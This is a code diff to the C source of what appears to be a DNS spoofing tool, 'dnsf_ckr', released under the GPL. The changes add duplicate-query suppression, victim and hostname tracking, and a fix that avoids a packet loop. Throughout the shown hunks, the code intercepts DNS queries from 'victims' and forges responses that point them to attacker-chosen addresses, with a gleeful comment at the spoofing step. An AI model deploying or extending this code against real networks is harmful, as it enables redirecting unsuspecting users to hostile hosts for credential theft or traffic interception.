@@ -1,3 +1,10 @@
+/*
+ *                              Copyright (C) 2014 by Rafael Santiago
+ *
+ * This is free software. You can redistribute it and/or modify under
+ * the terms of the GNU General Public License version 2.
+ *
+ */
 #include "dnsspf.h"
 #include "udp.h"
 #include "ip.h"
@@ -8,6 +15,10 @@
 #include <string.h>
 #include <stdio.h>
 #include <arpa/inet.h>
+#include <time.h>
+
+static char last_name_resolved[0xff] = "";
+static time_t last_resolution_time = 0;
 
 static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions) {
     dnsf_ckr_realdnstransactions_ctx *tp;
@@ -87,7 +98,7 @@ void dnsf_ckr_spoof_dns_response(dnsf_ckr_pktctx **dns, dnsf_ckr_hostnames_ctx *
     memcpy((*dns)->rscrecfmt.rdata, &hostname->addr, sizeof(hostname->addr));
 }
 
-dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6]) {
+dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo) {
     struct dnsf_ckr_ip_header *ip = NULL;
     struct dnsf_ckr_udp_header *udp = NULL;
     struct dnsf_ckr_ethernet_frame eth;
@@ -100,6 +111,11 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
     unsigned long temp_addr;
     size_t rawpktsz;
     dnsf_ckr_action_t action = dnsf_ckr_action_none;
+    if (domain_name != NULL) {
+        memset(domain_name, 0, domain_name_sz);
+    }
+    *victim = NULL;
+    *hostinfo = NULL;
     if (pktsz < 20) {
         return dnsf_ckr_action_none;
     }
@@ -116,8 +132,24 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                 dns = unpack_dns_data(udp->payload, udp->payload_size);
                 if (dns->qr == 0) { //  ..must be a query..
                     hostname = dnsf_ckr_qname2cstr(dns->questionsec.qname);
+                    //printf("HOSTNAME = %s\n", hostname);
+                    if (strcmp(hostname, last_name_resolved) == 0) {
+                        if ((time(0) - last_resolution_time) < 10) {
+                            free(ip->payload);
+                            free(ip);
+                            free(udp->payload);
+                            free(udp);
+                            free(dns);
+                            return dnsf_ckr_action_none;
+                        }
+                    }
+                    strncpy(last_name_resolved, hostname, sizeof(last_name_resolved) - 1);
+                    last_resolution_time = time(0);
+                    strncpy(domain_name, hostname, domain_name_sz - 1);
                     if ((hp = dnsf_ckr_must_spoof_dns_response(ip->src, hostname, fakenameserver))) { //  we really want to spoof it?
                         vp = dnsf_ckr_get_victim_from_transactions(ip->src, transactions);
+                        *hostinfo = hp;
+                        *victim = vp;
                         //  ..ok, here we go!! >:)
                         action = dnsf_ckr_action_spoof;
                         dnsf_ckr_spoof_dns_response(&dns, hp);
@@ -172,6 +204,7 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                     } else {
                         vp = dnsf_ckr_get_victim_from_transactions(ip->src, transactions);
                         if (vp != NULL) {
+                            *victim = vp;
                             action = dnsf_ckr_action_spoof;
                             //  ..otherwise we need to discover the real ip of this untreated domain
                             //  and so repass it to the "victim".
@@ -226,7 +259,9 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                     free(dns);
                 }
             } else {
-                action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
+                //  INFO(Santiago): avoiding packet loop.
+                //action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
+                //*outpkt = NULL;
             }
             if (udp != NULL) {
                 if (udp->payload != NULL) {
@@ -236,6 +271,7 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
             }
         } else {
             action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
+            //*outpkt = NULL;
         }
 
     }
